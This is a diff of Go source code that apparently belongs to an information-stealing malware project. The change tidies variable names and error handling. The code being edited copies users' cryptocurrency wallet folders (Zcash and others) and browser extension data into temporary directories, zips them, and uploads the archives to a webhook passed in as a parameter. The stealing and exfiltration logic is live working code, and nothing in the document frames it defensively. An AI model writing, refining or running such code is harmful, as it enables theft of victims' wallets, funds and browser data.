@@ -18,8 +18,8 @@ func Run(webhook string) {
 
 func Local(webhook string) {
 	users := hardware.GetUsers()
-	tempdir := fmt.Sprintf("%s\\wallets-temp", os.TempDir())
-	defer os.RemoveAll(tempdir)
+	tempDir := fmt.Sprintf("%s\\wallets-temp", os.TempDir())
+	defer os.RemoveAll(tempDir)
 	found := ""
 	Paths := map[string]string{
 		"Zcash":        "\\Zcash",
@@ -42,8 +42,7 @@ func Local(webhook string) {
 			if !fileutil.IsDir(path) {
 				continue
 			}
-			err := fileutil.Copy(path, fmt.Sprintf("%s\\%s\\%s", tempdir, strings.Split(user, "\\")[2], name))
-			if err != nil {
+			if err := fileutil.Copy(path, fmt.Sprintf("%s\\%s\\%s", tempDir, strings.Split(user, "\\")[2], name)); err != nil {
 				continue
 			}
 
@@ -59,21 +58,20 @@ func Local(webhook string) {
 		found = "Too many wallets to list."
 	}
 
-	tempzip := fmt.Sprintf("%s\\wallets.zip", os.TempDir())
-	err := fileutil.Zip(tempdir, tempzip)
-	if err != nil {
+	tempZip := fmt.Sprintf("%s\\wallets.zip", os.TempDir())
+	if err := fileutil.Zip(tempDir, tempZip); err != nil {
 		return
 	}
 
-	defer os.RemoveAll(tempdir)
-	defer os.Remove(tempzip)
+	defer os.RemoveAll(tempDir)
+	defer os.Remove(tempZip)
 
 	requests.Webhook(webhook, map[string]interface{}{
 		"embeds": []map[string]interface{}{{
 			"title":       "Wallets",
 			"description": "```" + found + "```",
 		}},
-	}, tempzip)
+	}, tempZip)
 }
 
 func Extensions(webhook string) {
@@ -189,8 +187,8 @@ func Extensions(webhook string) {
 		return
 	}
 
-	tempdir := fmt.Sprintf("%s\\extensions-temp", os.TempDir())
-	defer os.RemoveAll(tempdir)
+	tempDir := fmt.Sprintf("%s\\extensions-temp", os.TempDir())
+	defer os.RemoveAll(tempDir)
 	found := ""
 
 	for _, profile := range profilesPaths {
@@ -200,7 +198,7 @@ func Extensions(webhook string) {
 				continue
 			}
 
-			err := fileutil.Copy(path, fmt.Sprintf("%s\\%s\\%s", tempdir, profile.Browser.User, name))
+			err := fileutil.Copy(path, fmt.Sprintf("%s\\%s\\%s", tempDir, profile.Browser.User, name))
 			if err != nil {
 				continue
 			}
@@ -216,16 +214,15 @@ func Extensions(webhook string) {
 		found = "Too many extensions to list."
 	}
 
-	tempzip := fmt.Sprintf("%s\\extensions.zip", os.TempDir())
-	err := fileutil.Zip(tempdir, tempzip)
-	if err != nil {
+	tempZip := fmt.Sprintf("%s\\extensions.zip", os.TempDir())
+	if err := fileutil.Zip(tempDir, tempZip); err != nil {
 		return
 	}
-	defer os.Remove(tempzip)
+	defer os.Remove(tempZip)
 	requests.Webhook(webhook, map[string]interface{}{
 		"embeds": []map[string]interface{}{{
 			"title":       "Extensions",
 			"description": "```" + found + "```",
 		}},
-	}, tempzip)
+	}, tempZip)
 }
